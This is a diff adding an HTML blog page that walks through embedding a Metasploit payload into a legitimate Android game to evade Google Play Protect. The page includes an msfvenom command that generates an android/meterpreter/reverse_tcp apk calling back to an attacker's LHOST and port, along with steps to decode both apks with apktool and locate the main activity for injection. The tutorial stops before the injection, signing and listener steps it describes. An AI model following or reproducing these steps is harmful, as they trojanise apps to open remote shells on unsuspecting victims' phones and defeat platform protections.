@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bypass Android Security</title>
+    <!-- <link rel="stylesheet" href="css/style.css"> -->
+    <!-- <link rel="stylesheet" href="https://unpkg.com/xp.css" /> -->
+    <!-- <link rel="stylesheet" href="https://unpkg.com/xp.css@0.2.3/dist/98.css" /> -->
+    <link rel="stylesheet" href="https://cdn.simplecss.org/simple.min.css">
+    <!-- <style>
+        body {
+            text-align: center;
+        }
+
+        section h2 {
+            text-align: left;
+        }
+
+        section ul {
+            text-align: left;
+            /* Reset text-align for list items */
+            display: inline-block;
+            /* Ensure list items are centered */
+        }
+
+        section li {
+            text-align: left;
+        }
+    </style> -->
+</head>
+
+<body>
+
+    <header>
+        <h1>Bypass google play protect, and test installing a malicious apk to android phone (android 13 and below
+            tested)</h1>
+    </header>
+
+    <nav>
+        <a href="/index.html">Home</a>
+        <a href="/about.html">About</a>
+        <a href="/contact.html">Contact</a>
+    </nav>
+
+    <p>In this blog I've discussed how we can generate a reverse shell or a meterpreter shell using metasploit
+        framework, and then use that payload to embed the malicious code into a legit .apk file and bypass android
+        security as well as google play protect.</p>
+
+    <p>Here the conncept we are using to evade security is, we'll use a legit .apk file and decode it using 'apktool'.
+        Then modify the AndroidManifest.xml and main activity .smali file and rebuild the .apk. Once complete, sign the
+        .apk using jarsigner and then verifying the .apk into a new file using Zipalign
+    </p>
+    <img src="/brsd/hacking/images/android-bypass-flow.PNG" alt="steps to bypass security"
+        style="width: 300px; height: auto; margin: auto;">
+
+
+    <section id="bypass-android-security">
+        <h2>create a palyload using msfvenom</h2>
+        <ul>
+            <li>
+                we will create a meterpreter reverse tcp payload using msfvenom. Make sure metasploit framework is
+                installed in your machine.
+            </li>
+            <li>
+                we can choose any palyload we wish to in msfvenom. I have used meterpreter reverse
+                tcp(android/meterpreter/reverse_tcp) and not just reverse shell(android/shell/reverse_tcp) as
+                meterpreter gives us more options to perform on victim than just reverse shell.
+                <pre class="line-numbers">
+                    <code class="language-bash">
+                        msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.xx.xx LPORT=5555 R > payload.apk
+                    </code>
+                 </pre>
+                <img src="/brsd/hacking/images/create-payload.PNG" alt="msfvenom command"
+                    style="width: 800px; height: 300px;">
+            </li>
+            <li>
+                we need to mention the host and port accordingly. The LPORT is the port where we will start a listener
+                to sniff on victim and LHOST is the IP address of the machine where we want to listen.
+            </li>
+        </ul>
+        <h2>Decode the created payload using 'apktool'</h2>
+        <ul>
+            <li>
+                Now we need to decode the apk that we just got from msfvenom. We will use 'apktool' to decode as well to
+                build back the apk.
+            </li>
+            <li>
+                we can install 'apktool' in debian using [apt-get install apktool]. Install the tool from the ftp debian
+                source by adding the url(deb http://ftp.de.debian.org/debian buster main) into (/etc/apt/sources.list)
+                and comment out any other source to explicitly use the ftp source.
+            </li>
+            <li>
+                Once installed decode the payload using [apktool d payload.apk]. The decoded app directory will be
+                present in PWD with the same name as apk file, so in our case payload.
+            </li>
+            <img src="/brsd/hacking/images/decode-payload.PNG" alt="decoding payload" style="width: 800px; height: 300px;">
+        </ul>
+        <h2>Downlaod a legit apk and decode it</h2>
+        <ul>
+            <li>
+                Download an apk where you can embed the payload. Here I'm using a android game called <a
+                    href="https://run-bird-run.en.softonic.com/android">RunBird</a>. You can use any
+                legit apk as per your wish.
+            </li>
+            <li>
+                Once downloaded we can then decode it using 'apktool' as shown earlier.
+            </li>
+        </ul>
+        <h2>Finding the mainactivity file and editing it.</h2>
+        <ul>
+            <li>
+                So now as we have decoded the RunBird apk, we need to open the AndroidManifest.xml file from the
+                runbrird directory. Androidmanifest XML file contains all the important information about the
+                application such as permissions. Main activity is the first interface launching when a user open the
+                application for the first time. Path to the main activity file can always be found above the main
+                command in androidmanifest XML file.
+            </li>
+            <img src="/brsd/hacking/images/AndroidManifest.PNG" alt="AndroidManifest.xml file"
+                style="width: 800px; height: 300px;">
+        </ul>
+    </section>
+
+    <footer>
+        <p>&copy; 2024 bijayrajsinghdeo. All rights reserved.</p>
+    </footer>
+
+    <script src="js/dark-mode.js"></script>
+
+</body>
+
+</html>
